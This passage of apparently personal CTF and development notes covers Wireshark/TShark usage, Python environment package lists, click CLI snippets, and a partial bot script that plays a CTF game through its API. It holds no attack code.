<h2 id="installation-1"><a class="header" href="#installation-1">Installation</a></h2>
<ul>
<li>For Linux (Debian/Ubuntu) :</li>
</ul>
<pre><code class="language-shell">sudo apt-get install wireshark
</code></pre>
<ul>
<li>For Windows : you can download the installer from the official website (https://www.wireshark.org/download.html) and follow the installation instructions.</li>
</ul>
<h2 id="use-cases"><a class="header" href="#use-cases">Use cases</a></h2>
<ul>
<li>
<p><strong>Network troubleshooting</strong> : to identify and resolve network issues such as packet loss, delays, and configuration errors.</p>
</li>
<li>
<p><strong>Network security</strong> : in the context of intrusion detection, malware analysis, and network security monitoring to detect flows related to suspicious activities.</p>
</li>
</ul>
<h2 id="main-features"><a class="header" href="#main-features">Main features</a></h2>
<ul>
<li><strong>Advanced filtering</strong> : allows filtering packets based on criteria such as IP address, port, protocol, etc., to focus on specific elements.</li>
<li><strong>Detailed analysis</strong> : provides in-depth packet analysis, including header inspection, data stream tracking, session reconstruction, etc.</li>
<li><strong>Support for numerous protocols</strong> : supports a wide range of network protocols, such as TCP, UDP, HTTP, DNS, FTP, and many more.</li>
<li><strong>Data export</strong> : analysis results can be exported in various formats such as CSV, XML, and PCAP.</li>
<li><strong>Graphs and statistics</strong> : allows you to generate graphs and statistics to visualize network performance.</li>
</ul>
<h2 id="tshark"><a class="header" href="#tshark">TShark</a></h2>
<p>&quot;TShark&quot; is a CLI version of Wireshark, providing the same capabilities for recording and analyzing network captures, but through the command line only. TShark can be useful in many cases, including :</p>
<ul>
<li>Automated processing via scripts ;</li>
<li>Data extraction ;</li>
<li>Server usage ;</li>
<li>...</li>
</ul>
<h2 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h2>
<h3 id="example-of-usage"><a class="header" href="#example-of-usage">Example of Usage</a></h3>
<p>Suppose you are facing latency issues on a local network, you can launch Wireshark and select the network interface to monitor.
By applying a filter to capture only relevant traffic and filtering traffic to or from a specific IP address, for example, you can analyze the results to identify sources of latency, such as transmission delays or packet losses.</p>
<ul>
<li>Analysis of Captured Data Packets on a Network</li>
<li>Data Flow Tracking Feature (UDP, TCP...)</li>
<li>Packet Filtering by IP Address</li>
<li>In-Depth Analysis of a Frame</li>
<li>Usage of TShark</li>
</ul>
<p>Here is an example of using tshark, let’s imagine a significant network capture with a large number of packets, but we are only interested in the DNS and HTTP protocols. We can extract packets containing these protocols into a new capture using Tshark :</p>
<pre><code class="language-shell">4 tshark -r capture_example.pcapng -Y 'http || dns' -w out.pcapng
</code></pre>
<p>We can then read the capture with tshark :</p>
<pre><code class="language-shell">$ tshark -r out.pcapng

1 0.000000000 192.168.121.3 → 192.168.202.49 DNS 103 Standard query response 0x6f3d A lost.com A 104.21.5.178 A 172.67.133.176
2 0.000000209 192.168.121.3 → 192.168.202.49 DNS 127 Standard query response 0x8802 AAAA lost.com AAAA 2606:4700:3033::6815:5b2 AAAA 2606:4700:3037::ac43:85b0
3 0.009499422 192.168.5.74 → 104.21.5.178 HTTP 141 GET / HTTP/1.1
4 0.377068826 104.21.5.178 → 192.168.5.74 HTTP 73 Continuation
</code></pre>
<h2 id="tips"><a class="header" href="#tips">Tips</a></h2>
<ul>
<li>Display only TCP payload</li>
</ul>
<p>Filter -&gt; <code>tcp.payload</code></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="python-pyenv-lab"><a class="header" href="#python-pyenv-lab">Python pyenv Lab.</a></h1>
<h2 id="ctf_env_39"><a class="header" href="#ctf_env_39"><code>ctf_env_39</code></a></h2>
<ul>
<li>
<p>Python 3.9.19</p>
</li>
<li>
<p>pip</p>
</li>
</ul>
<pre><code>alembic==1.13.1
androguard==3.4.0a1
annotated-types==0.7.0
anyio==4.4.0
apkInspector==1.2.3
argon2-cffi==23.1.0
argon2-cffi-bindings==21.2.0
arrow==1.3.0
asn1crypto==1.5.1
astroid==3.2.2
asttokens==2.4.1
async-lru==2.0.4
attrs==23.2.0
Automat==22.10.0
Babel==2.15.0
banal==1.0.6
bcrypt==4.1.3
beautifulsoup4==4.12.3
black==24.4.2
bleach==6.1.0
blinker==1.8.2
capstone==5.0.1
certifi==2024.2.2
cffi==1.16.0
charset-normalizer==3.3.2
cli_helpers==2.3.1
click==8.1.7
colorama==0.4.6
colored-traceback==0.3.0
comm==0.2.2
configobj==5.0.8
constantly==23.10.4
contourpy==1.2.1
cryptography==42.0.7
cssselect==1.2.0
cycler==0.12.1
dataset==1.6.2
debugpy==1.8.1
decorator==5.1.1
defusedxml==0.7.1
delegator.py==0.1.1
dill==0.3.8
et-xmlfile==1.1.0
exceptiongroup==1.2.1
executing==2.0.1
fastjsonschema==2.19.1
filelock==3.14.0
flake8==7.0.0
Flask==3.0.3
fonttools==4.53.0
fqdn==1.5.1
frida==16.3.1
frida-tools==12.4.3
graphviz==0.20.3
greenlet==3.0.3
h11==0.14.0
httpcore==1.0.5
httpx==0.27.0
hyperlink==21.0.0
idna==3.7
importlib_metadata==7.1.0
importlib_resources==6.4.0
incremental==22.10.0
intervaltree==3.1.0
ipykernel==6.29.4
ipython==8.18.1
isoduration==20.11.0
isort==5.13.2
itemadapter==0.9.0
itemloaders==1.3.0
itsdangerous==2.2.0
jedi==0.19.1
Jinja2==3.1.4
jmespath==1.0.1
json5==0.9.25
jsonpointer==2.4
jsonschema==4.22.0
jsonschema-specifications==2023.12.1
jupyter-events==0.10.0
jupyter-lsp==2.2.5
jupyter_client==8.6.2
jupyter_core==5.7.2
jupyter_server==2.14.1
jupyter_server_terminals==0.5.3
jupyterlab==4.2.1
jupyterlab_pygments==0.3.0
jupyterlab_server==2.27.2
kiwisolver==1.4.5
litecli==1.11.0
loguru==0.7.2
lxml==5.2.2
Mako==1.3.5
MarkupSafe==2.1.5
matplotlib==3.9.0
matplotlib-inline==0.1.7
mccabe==0.7.0
mistune==3.0.2
mutf8==1.0.6
myhdl==0.11.45
mypy==1.10.0
mypy-extensions==1.0.0
nbclient==0.10.0
nbconvert==7.16.4
nbformat==5.10.4
nest-asyncio==1.6.0
networkx==3.2.1
notebook_shim==0.2.4
numpy==1.26.4
objection==1.11.0
opencv-python==4.9.0.80
openpyxl==3.1.3
oscrypto==1.3.0
overrides==7.7.0
packaging==24.0
pandas==2.2.2
pandocfilters==1.5.1
paramiko==3.4.0
parsel==1.9.1
parso==0.8.4
pathspec==0.12.1
pexpect==4.9.0
pillow==10.3.0
platformdirs==4.2.2
plotly==5.22.0
plumbum==1.8.3
prettytable==3.10.0
prometheus_client==0.20.0
prompt_toolkit==3.0.45
Protego==0.3.1
psutil==5.9.8
ptyprocess==0.7.0
pure-eval==0.2.2
pwntools==4.12.0
pyasn1==0.6.0
pyasn1_modules==0.4.0
pycodestyle==2.11.1
pycparser==2.22
pydantic==2.7.2
pydantic_core==2.18.3
PyDispatcher==2.0.7
pydot==2.0.0
pyelftools==0.31
pyfiglet==1.0.2
pyflakes==3.2.0
Pygments==2.18.0
pylint==3.2.2
PyNaCl==1.5.0
pyOpenSSL==24.1.0
pyparsing==3.1.2
pyserial==3.5
PySocks==1.7.1
pytesseract==0.3.13
python-dateutil==2.9.0.post0
python-json-logger==2.0.7
pytz==2024.1
PyYAML==6.0.1
pyzmq==26.0.3
quark-engine==24.5.1
queuelib==1.7.0
r2pipe==1.8.0
referencing==0.35.1
requests==2.32.3
requests-file==2.1.0
rfc3339-validator==0.1.4
rfc3986-validator==0.1.1
ROPGadget==7.4
rpds-py==0.18.1
rpyc==6.0.0
rzpipe==0.6.0
Scrapy==2.11.2
semver==2.13.0
Send2Trash==1.8.3
service-identity==24.1.0
sherlock==0.4.1
six==1.16.0
sniffio==1.3.1
sortedcontainers==2.4.0
soupsieve==2.5
SQLAlchemy==1.4.52
sqlparse==0.5.0
stack-data==0.6.3
tabulate==0.9.0
tenacity==8.3.0
terminado==0.18.1
tinycss2==1.3.0
tldextract==5.1.2
tomli==2.0.1
tomlkit==0.12.5
tornado==6.4
tqdm==4.66.4
traitlets==5.14.3
Twisted==24.3.0
types-python-dateutil==2.9.0.20240316
typing_extensions==4.12.0
tzdata==2024.1
unicorn==2.0.1.post1
unix-ar==0.2.1
uri-template==1.3.0
urllib3==2.2.1
w3lib==2.1.2
wcwidth==0.2.13
webcolors==1.13
webencodings==0.5.1
websocket-client==1.8.0
Werkzeug==3.0.3
zipp==3.19.1
zope.interface==6.4.post2
zstandard==0.22.0
</code></pre>
<h2 id="volatility_27"><a class="header" href="#volatility_27"><code>volatility_27</code></a></h2>
<ul>
<li>
<p>Python 2.7.18</p>
</li>
<li>
<p>pip</p>
</li>
</ul>
<pre><code>certifi==2021.10.8
chardet==4.0.0
construct==2.10.54
distorm3==3.5.2
docopt==0.6.2
idna==2.10
pycrypto==2.6.1
requests==2.27.1
urllib3==1.26.16
vol==0.1.1
</code></pre>
<h2 id="frida_env"><a class="header" href="#frida_env"><code>frida_env</code></a></h2>
<ul>
<li>
<p>Python 3.10.10</p>
</li>
<li>
<p>pip</p>
</li>
</ul>
<pre><code>anyio==3.7.0
argon2-cffi==21.3.0
argon2-cffi-bindings==21.2.0
arrow==1.2.3
astroid==3.0.1
asttokens==2.2.1
async-lru==2.0.2
attrs==23.1.0
Babel==2.12.1
backcall==0.2.0
beautifulsoup4==4.12.2
black==23.10.0
bleach==6.0.0
certifi==2023.5.7
cffi==1.15.1
charset-normalizer==3.1.0
click==8.1.7
colorama==0.4.6
comm==0.1.3
debugpy==1.6.7
decorator==5.1.1
defusedxml==0.7.1
dill==0.3.7
exceptiongroup==1.1.1
executing==1.2.0
fastjsonschema==2.17.1
flake8==6.1.0
fqdn==1.5.1
frida==16.1.4
frida-tools==12.3.0
idna==3.4
ipykernel==6.23.3
ipython==8.14.0
isoduration==20.11.0
isort==5.12.0
jedi==0.18.2
Jinja2==3.1.2
json5==0.9.14
jsonpointer==2.4
jsonschema==4.17.3
jupyter-events==0.6.3
jupyter-lsp==2.2.0
jupyter_client==8.3.0
jupyter_core==5.3.1
jupyter_server==2.6.0
jupyter_server_terminals==0.4.4
jupyterlab==4.0.2
jupyterlab-pygments==0.2.2
jupyterlab_server==2.23.0
lief==0.13.2
MarkupSafe==2.1.3
matplotlib-inline==0.1.6
mccabe==0.7.0
mistune==3.0.1
mypy-extensions==1.0.0
nbclient==0.8.0
nbconvert==7.6.0
nbformat==5.9.0
nest-asyncio==1.5.6
notebook_shim==0.2.3
overrides==7.3.1
packaging==23.1
pandocfilters==1.5.0
parso==0.8.3
pathspec==0.11.2
pexpect==4.8.0
pickleshare==0.7.5
platformdirs==3.8.0
prometheus-client==0.17.0
prompt-toolkit==3.0.38
psutil==5.9.5
ptyprocess==0.7.0
pure-eval==0.2.2
pycodestyle==2.11.1
pycparser==2.21
pyflakes==3.1.0
Pygments==2.15.0
pylint==3.0.2
pyrsistent==0.19.3
python-dateutil==2.8.2
python-json-logger==2.0.7
PyYAML==6.0
pyzmq==25.1.0
requests==2.31.0
rfc3339-validator==0.1.4
rfc3986-validator==0.1.1
Send2Trash==1.8.2
six==1.16.0
sniffio==1.3.0
soupsieve==2.4.1
stack-data==0.6.2
terminado==0.17.1
tinycss2==1.2.1
tomli==2.0.1
tomlkit==0.12.1
tornado==6.3.2
traitlets==5.9.0
typing_extensions==4.5.0
uri-template==1.3.0
urllib3==2.0.3
wcwidth==0.2.6
webcolors==1.13
webencodings==0.5.1
websocket-client==1.6.1
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dev"><a class="header" href="#dev">Dev.</a></h1>
<h2 id="training-1"><a class="header" href="#training-1">Training</a></h2>
<h2 id="language"><a class="header" href="#language">Language</a></h2>
<table><thead><tr><th>Name</th><th>Purpose</th><th>Imperative</th><th>Object-oriented</th><th>Functional</th><th>Procedural</th><th>Generic</th><th>Reflective</th><th>Other paradigms</th><th>Standardized</th></tr></thead><tbody>
<tr><td><a href="dev/./python/index.html">Python</a></td><td>Application, general, web, scripting, artificial intelligence, scientific computing</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Aspect-oriented</td><td>De facto standard via Python Enhancement Proposals (PEPs)</td></tr>
<tr><td><a href="dev/./rust/index.html">Rust</a></td><td>Application, server-side, system, web</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Concurrent</td><td>No</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="python"><a class="header" href="#python">Python</a></h1>
<h2 id="pyenv"><a class="header" href="#pyenv">pyenv</a></h2>
<p>Dev. environment setup.</p>
<ul>
<li><a href="https://blog.stephane-robert.info/post/python-pyenv-pipenv/">Utilisation plusieurs versions de python avec Pyenv</a></li>
</ul>
<h2 id="linter"><a class="header" href="#linter">linter</a></h2>
<p><a href="https://realpython.com/python-code-quality/">Python Code Quality: Tools &amp; Best Practices</a></p>
<h3 id="error-pip-install"><a class="header" href="#error-pip-install">Error pip install</a></h3>
<ul>
<li>Error message with <code>pip install</code></li>
</ul>
<pre><code>$ pip install pwntools
error: externally-managed-environment

× This environment is externally managed
╰─&gt; To install Python packages system-wide, try 'pacman -S
    python-xyz', where xyz is the package you are trying to
    install.
    
    If you wish to install a non-Arch-packaged Python package,
    create a virtual environment using 'python -m venv path/to/venv'.
    Then use path/to/venv/bin/python and path/to/venv/bin/pip.
    
    If you wish to install a non-Arch packaged Python application,
    it may be easiest to use 'pipx install xyz', which will manage a
    virtual environment for you. Make sure you have python-pipx
    installed via pacman.

note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
hint: See PEP 668 for the detailed specification.

</code></pre>
<ul>
<li>Soluce</li>
</ul>
<pre><code>The --break-system-packages flag in pip allows to override the externally-managed-environment error and install Python packages system-wide.

pip install package_name --break-system-packages

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="snippets"><a class="header" href="#snippets">Snippets</a></h1>
<p>Some useful snippet code for CTF</p>
<style>
.badge_module {
  background-color: #ffc107;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_theme {
  background-color: #3a87ad;
  color: white;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
</style>
<table>
    <thead>
        <tr>
            <th>Folder</th>
            <th>Tags</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <!-- ITEM --> 
        <tr>
            <td rowspan="2">MovieToken</td>
            <td>
                <span class="badge_module">tesseract</span>
                <span class="badge_module">Open-CV</span>
                <span class="badge_module">Pillow</span>
                <span class="badge_module">Click</span>
            </td>
            <td rowspan="2">Extract text information from movie.</td>
        </tr>
        <tr>
            <td>
                <span class="badge_theme">MP4</span>
                <span class="badge_theme">PNG</span>
                <span class="badge_theme">Regular Expression</span>
            </td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td rowspan="2">GetPostRequestPydantic</td>
            <td>
                <span class="badge_module">Request</span>
                <span class="badge_module">pydantic</span>
            </td>
            <td rowspan="2">Send and receive request.</td>
        </tr>
        <tr>
            <td>
                <span class="badge_theme">Logging</span>
                <span class="badge_theme">functools::partial</span>
            </td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td rowspan="2">TcpChallenges</td>
            <td>
                <span class="badge_module">Socket</span>
            </td>
            <td rowspan="2">Challenge code with game server..</td>
        </tr>
        <tr>
            <td>
                <span class="badge_theme">Regular Expression</span>
            </td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td>FullClickSnippet</td>
            <td>
                <span class="badge_module">Click</span>
            </td>
            <td>Some snippet about click.</td>
        </tr>
    </tbody>
</table><div style="break-before: page; page-break-before: always;"></div><h1 id="click"><a class="header" href="#click">Click</a></h1>
<p>Quelques <em>snippets</em> d'utilisation de click</p>
<h2 id="requirements"><a class="header" href="#requirements">Requirements</a></h2>
<pre><code class="language-ini">click==8.*
PyYAML==6.*
pytoml==0.1.21
</code></pre>
<h2 id="basic-1"><a class="header" href="#basic-1">Basic</a></h2>
<p>Utilisation d'un argument <em>positional</em> avec l'aide en ligne.</p>
<pre><code class="language-python">#!/usr/bin/env python3
&quot;&quot;&quot;Basic click demo.&quot;&quot;&quot;

import click


@click.command(
    context_settings={&quot;help_option_names&quot;: [&quot;-h&quot;, &quot;--help&quot;]},
    help=&quot;Basic demo.&quot;,
)
@click.argument(
    &quot;name&quot;,
    type=click.STRING,
    metavar=&quot;NAME &quot;,
)
def main(name: str):
    &quot;&quot;&quot;Main function.&quot;&quot;&quot;
    click.clear()
    click.echo(f&quot;Hello {name} (classic)&quot;)
    click.secho(f&quot;Hello {name} (fg only)&quot;, fg=&quot;green&quot;)
    click.secho(f&quot;Hello {name} (bg only)&quot;, bg=&quot;yellow&quot;)
    click.secho(f&quot;Hello {name} (both fg &amp; bg)&quot;, fg=&quot;red&quot;, bg=&quot;blue&quot;)


if __name__ == &quot;__main__&quot;:
    main()  # pylint: disable=E1120

</code></pre>
<h2 id="prompt"><a class="header" href="#prompt">Prompt</a></h2>
<p>Si un parametre est manquant, on utilise un prompt:</p>
<pre><code class="language-python">#!/usr/bin/env python3
&quot;&quot;&quot;Use prompt for parameter.&quot;&quot;&quot;

import click


@click.command(
    context_settings={&quot;help_option_names&quot;: [&quot;-h&quot;, &quot;--help&quot;]},
    help=&quot;Basic demo 2: Use prompt if arguments is missing.&quot;,
)
@click.option(&quot;-n&quot;, &quot;--name&quot;, prompt=&quot;Your name&quot;, help=&quot;The person to greet.&quot;)
@click.option(&quot;-c&quot;, &quot;--count&quot;, default=1, help=&quot;number of greetings&quot;)
def main(name: str, count: int):
    &quot;&quot;&quot;Simple program that greets NAME for a total of COUNT times.&quot;&quot;&quot;
    for _ in range(count):
        click.echo(f&quot;Hello, {name}!&quot;)


if __name__ == &quot;__main__&quot;:
    main()  # pylint: disable=E11
</code></pre>
<h2 id="parametre-du-type-path"><a class="header" href="#parametre-du-type-path">Parametre du type <code>Path</code></a></h2>
<p>On utilise un parametre dont les proprietes seront verifier mais dont le resultats sera un <code>string</code> pour permetre de créér un <em>Path</em></p>
<pre><code class="language-python">#!/usr/bin/env python3
&quot;&quot;&quot;Parse and display data with click.file.&quot;&quot;&quot;

from typing import Dict, List
from string import ascii_letters
import math
from pathlib import Path

from collections import Counter
import click


def convert_size(size_bytes):
    &quot;&quot;&quot;Convert size in human readable form.&quot;&quot;&quot;
    if size_bytes == 0:
        return &quot;0B&quot;
    size_name = (&quot;B&quot;, &quot;KB&quot;, &quot;MB&quot;, &quot;GB&quot;, &quot;TB&quot;)
    i = int(math.floor(math.log(size_bytes, 1024)))
    if i &gt;= len(size_name):
        return &quot;0B&quot;
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f&quot;{s} {size_name[i]}&quot;


@click.command(
    context_settings={&quot;help_option_names&quot;: [&quot;-h&quot;, &quot;--help&quot;]},
    help=&quot;Basic demo 3: Use click.Path arguments.&quot;,
)
@click.argument(
    &quot;folder_path&quot;,
    type=click.Path(exists=True, file_okay=False, dir_okay=True),
    metavar=&quot;MY_DIRECTORY&quot;,
)
@click.argument(
    &quot;file_path&quot;,
    type=click.Path(exists=True, file_okay=True, dir_okay=False),
    metavar=&quot;MY_FILE&quot;,
)
def main(folder_path: str, file_path: str):
    &quot;&quot;&quot;Main function.&quot;&quot;&quot;
    click.clear()

    folder_path = Path(folder_path)
    file_path = Path(file_path)

    # Display directory
    files: List[Path] = folder_path.glob(&quot;*.py&quot;)
    files_details: List[str] = [
        f&quot;{x.stem} ({convert_size(x.stat().st_size)})&quot; for x in files
    ]
    click.secho(&quot;Glob folder&quot;, bg=&quot;green&quot;)
    click.echo(&quot;\n&quot;.join(files_details))

    # File
    contains: str = file_path.read_text()  # pylint: disable=W1514
    stat: Dict[str, int] = Counter(contains)
    letter_stat = {k: v for k, v in stat.items() if k in ascii_letters}
    letter_stat = sorted(letter_stat.items(), key=lambda x: x[1], reverse=True)
    click.secho(f&quot;Letters statstics for {file_path.name}&quot;, bg=&quot;green&quot;)
    click.echo(&quot;\n&quot;.join(f&quot;{x[0]} =&gt; {x[1]}&quot; for x in letter_stat))


if __name__ == &quot;__main__&quot;:
    main()  # pylint: disable=E1120

</code></pre>
<h2 id="parametre-file"><a class="header" href="#parametre-file">Parametre <strong>FILE</strong></a></h2>
<p>Parametre de type <code>FILE</code>. <em>Handle</em> en paramtre.</p>
<pre><code class="language-python">#!/usr/bin/env python3
&quot;&quot;&quot;Read JSON file with Click.file.&quot;&quot;&quot;

from typing import IO
from json import load
import click


@click.command(
    context_settings={&quot;help_option_names&quot;: [&quot;-h&quot;, &quot;--help&quot;]},
    help=&quot;Basic demo 4: Use click.File arguments.&quot;,
)
@click.argument(&quot;json_file&quot;, type=click.File(mode=&quot;r&quot;, encoding=&quot;utf-8&quot;))
def main(json_file: IO[str]):
    &quot;&quot;&quot;Main function.&quot;&quot;&quot;
    click.clear()
    json_contains = load(json_file)
    click.secho(&quot;Json contains&quot;, bg=&quot;green&quot;)
    click.echo(json_contains)


if __name__ == &quot;__main__&quot;:
    main()  # pylint: disable=E1120

</code></pre>
<h2 id="parametre-enumchoice"><a class="header" href="#parametre-enumchoice">Parametre Enum/Choice</a></h2>
<p>Utilisation d'un <code>Enum</code> custom pour permettre d'exploiter un <em>choice</em></p>
<pre><code class="language-python">#!/usr/bin/env python3
&quot;&quot;&quot; Parse file according with parser.&quot;&quot;&quot;
from typing import IO, Optional

from enum import Enum

import json
import csv
import yaml

import click


class ConfigFormat(Enum):
    &quot;&quot;&quot;Enum format type.&quot;&quot;&quot;

    YAML = 0
    JSON = 1
    CSV = 2
    TXT = 3


class EnumType(click.Choice):
    &quot;&quot;&quot;Helper to ;ap Enum &lt;=&gt; click.Choice.&quot;&quot;&quot;

    def __init__(self, enum):
        self.__enum = enum
        super().__init__(enum.__members__)

    def convert(self, value, param, ctx):
        return self.__enum[super().convert(value, param, ctx)]


@click.command(
    context_settings={&quot;help_option_names&quot;: [&quot;-h&quot;, &quot;--help&quot;]},
    help=&quot;Basic demo 5: Use click.Choice arguments.&quot;,
)
@click.argument(&quot;file_path&quot;, type=click.File(mode=&quot;r&quot;, encoding=&quot;utf-8&quot;))
@click.option(
    &quot;-f&quot;,
    &quot;--form&quot;,
    type=EnumType(ConfigFormat),
    default=ConfigFormat.JSON.name,
    show_default=True,
    help=&quot;Select format type of input file&quot;,
)
def main(file_path: IO[str], form: ConfigFormat):
    &quot;&quot;&quot;Parse data from file according with format.&quot;&quot;&quot;

    click.clear()
    contains: Optional[str] = None

    if form == ConfigFormat.JSON:
        contains = json.load(file_path)
    elif form is ConfigFormat.YAML:
        contains = yaml.safe_load(file_path)
    elif form == ConfigFormat.CSV:
        spamreader = csv.reader(file_path, delimiter=&quot; &quot;, quotechar=&quot;|&quot;)
        contains = &quot;&quot;
        for row in spamreader:
            contains += f&quot;{', '.join(row)}\n&quot;
    else:
        contains = &quot;\n&quot;.join(file_path.readlines())

    click.secho(&quot;File contains&quot;, bg=&quot;green&quot;)
    click.echo(contains)


if __name__ == &quot;__main__&quot;:
    main()  # pylint: disable=E1120

</code></pre>
<h2 id="utilidation-des-group"><a class="header" href="#utilidation-des-group">Utilidation des <code>group</code></a></h2>
<pre><code class="language-python">#!/usr/bin/env python
&quot;&quot;&quot; Display some usefull tools available by group.&quot;&quot;&quot;

import time
import click


@click.group()
def cli():
    &quot;&quot;&quot;Examples of usefull click utils.&quot;&quot;&quot;


@cli.command()
def editor():
    &quot;&quot;&quot;Launch an editor.&quot;&quot;&quot;
    message = click.edit(&quot;Prepopulated text&quot;)
    click.echo(f&quot;Your message: {message}&quot;)


@cli.command(name=&quot;find-app-dir&quot;)
def find_app_dir():
    &quot;&quot;&quot;Find the appropriate application data folder.&quot;&quot;&quot;
    click.echo(click.get_app_dir(&quot;part05&quot;))


@cli.command()
@click.option(&quot;--lines&quot;, default=7, show_default=True)
def paging(lines: int):
    &quot;&quot;&quot;Page through output.&quot;&quot;&quot;
    data = &quot;\n&quot;.join([f&quot;Line {lines}&quot;])
    click.echo_via_pager(data)


@cli.command(name=&quot;progress-bar&quot;)
@click.option(
    &quot;--delay&quot;,
    help=&quot;Step progression delay.&quot;,
    required=True,
    default=0.5,
    show_default=True,
)
@click.option(&quot;--count&quot;, help=&quot;&quot;, default=10)
def progress_bar(count: int, delay: float):
    &quot;&quot;&quot;Display a progress bar.&quot;&quot;&quot;
    data = range(count)
    with click.progressbar(data) as click_bar:
        for _ in click_bar:
            time.sleep(delay)


if __name__ == &quot;__main__&quot;:
    cli()  # pylint: disable=E1120

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="get-and-post"><a class="header" href="#get-and-post">Get and Post</a></h1>
<p>Un petit programme pour faire des requetes <code>GET</code> et <code>POST</code> en python.
Ce script est la solution au CTF <code>DGHACK 2023</code> pour le chall de dev <code>Feed This Dragon</code></p>
<pre><code class="language-python">#! /usr/bin/env python

import sys
from typing import Callable, List, Dict
from uuid import uuid1
from functools import partial
from dataclasses import dataclass
from pydantic import BaseModel
import requests

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
file_handler = logging.FileHandler(&quot;log.txt&quot;)
file_handler.setLevel(logging.DEBUG)
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
logger.addHandler(console_handler)
logger.addHandler(file_handler)


URL = &quot;http://feedthisdragon4.chall.malicecyber.com/api/v1&quot;

TRAP: List[str] = [&quot;bomb&quot;]
FOOD: List[str] = [&quot;veggy&quot;, &quot;candy&quot;, &quot;burger&quot;, &quot;food&quot;]
BOOS: List[str] = [&quot;lilboo&quot;, &quot;midboo&quot;, &quot;bigboo&quot;]
LIFE: List[str] = [&quot;life&quot;]
FOX: List[str] = [&quot;fox&quot;]
MONEY: List[str] = [&quot;coin&quot;, &quot;gem&quot;]
SECRET: List[str] = [&quot;secret&quot;, &quot;nyan&quot;]


@dataclass
class NextPost:
    &quot;&quot;&quot;Next item to click.&quot;&quot;&quot;

    item: str = &quot;&quot;
    shop: str = &quot;&quot;


class Achievement(BaseModel):
    &quot;&quot;&quot;Achievements form.&quot;&quot;&quot;

    acquired: bool
    color: str
    description: str
    name: str
    slug: str
    uuid: str


class Item(BaseModel):
    &quot;&quot;&quot;Items data.&quot;&quot;&quot;

    type: str
    uuid: str
    x: int
    y: int


class Upgrade(BaseModel):
    &quot;&quot;&quot;Upgrade data.&quot;&quot;&quot;

    cost: int
    description: str
    level: int
    name: str
    slug: str
    uuid: str


class GameResponse(BaseModel):
    &quot;&quot;&quot;Game response&quot;&quot;&quot;

    achievements: List[Achievement]
    bag: int
    coin: int
    health: int
    hunger: int
    hunger_actual: int
    hunger_needed: int
    items: List[Item]
    level: int
    max_health: int
    upgrades: List[Upgrade]
    uuid: str


def format_header(*, uuid: str, update: str, itemUuid: str = &quot;&quot;, shopUuid: str = &quot;&quot;):
    &quot;&quot;&quot;Format post header.&quot;&quot;&quot;
    header = {
        # &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;,
        &quot;Cookie&quot;: f&quot;uuid={uuid}&quot;,
        &quot;Authorization&quot;: &quot;mynotsosecrettoken&quot;,
        &quot;Session&quot;: uuid,
        &quot;Update&quot;: update,
        &quot;ItemUuid&quot;: itemUuid,
        &quot;ShopUuid&quot;: shopUuid,
    }
    return header


def extract_items(game_map: GameResponse) -&gt; Dict[str, List[str]]:
    &quot;&quot;&quot;Allow to extract items information.&quot;&quot;&quot;
    available_items = {}
    for item in game_map.items:
        key = item.type
        available_items.setdefault(key, []).append(f&quot;[{item.x},{item.y}]&quot;)
    return available_items


def get_strategy(game_map: GameResponse) -&gt; List[Callable[[GameResponse], NextPost]]:
    &quot;&quot;&quot;Apply correct strategies.&quot;&quot;&quot;
    strategies: List[Callable[[GameResponse], NextPost]] = []

    if not game_map.items:
        return strategies

    # Map status
    not_achieved = [i.slug for i in game_map.achievements if not i.acquired]

    # [STRATEGY] Achievement Saw
    # saw =&gt; Why are those items so far from the screen
    if &quot;saw&quot; in not_achieved:
        strategies.append(find_item_coordinate)

    # [STRATEGY] Achievement 'Secret'
    if &quot;secret&quot; in not_achieved:
        strategies.append(partial(find_item, SECRET))

    # [STRATEGY] Achievement hurt
    if &quot;hurt&quot; in not_achieved:
        strategies.append(partial(find_item, TRAP))
    else:
        # [STRATEGY] Kill Boos
        strategies.append(partial(find_item, BOOS))

    # [STRATEGY] Health
    if game_map.health &lt;= 2:
        if game_map.coin == 0:
            strategies.append(partial(find_item, MONEY))
        else:
            strategies.append(partial(find_item, LIFE))
            strategies.append(partial(upgrades, &quot;Hard&quot;))

    # [STRATEGY] Achievement Fatter
    if &quot;fatter&quot; in not_achieved or &quot;bigger&quot; in not_achieved:
        strategies.append(partial(find_item, FOOD))
        strategies.append(partial(upgrades, &quot;Feed&quot;))

    # [STRATEGY] Achievement money
    if &quot;gold&quot; in not_achieved:
        strategies.append(partial(find_item, MONEY))
        strategies.append(partial(upgrades, &quot;Greed&quot;))
        if game_map.bag &lt; 10000:
            strategies.append(partial(upgrades, &quot;Bag&quot;))

    logger.debug(&quot;strategies =&gt;&quot;)
    for idx, strategy in enumerate(strategies):
        logger.debug(f&quot;\t- [{idx}] {strategy}&quot;)

    return strategies


def find_item_coordinate(game_map: GameResponse) -&gt; List[NextPost]:
    &quot;&quot;&quot;Strategy find item.&quot;&quot;&quot;
    next_list: List[NextPost] = []
    for item in game_map.items:
        if item.x &gt; 100 or item.y &gt; 100:
            return [NextPost(item=item.uuid)]
    return next_list


def find_item(ref_label: List[str], game_map: GameResponse) -&gt; List[NextPost]:
    &quot;&quot;&quot;Strategy find item.&quot;&quot;&quot;
    next_list: List[NextPost] = []
    for item in game_map.items:
        if item.type in ref_label:
            next_list.append(NextPost(item=item.uuid))

    if not next_list:
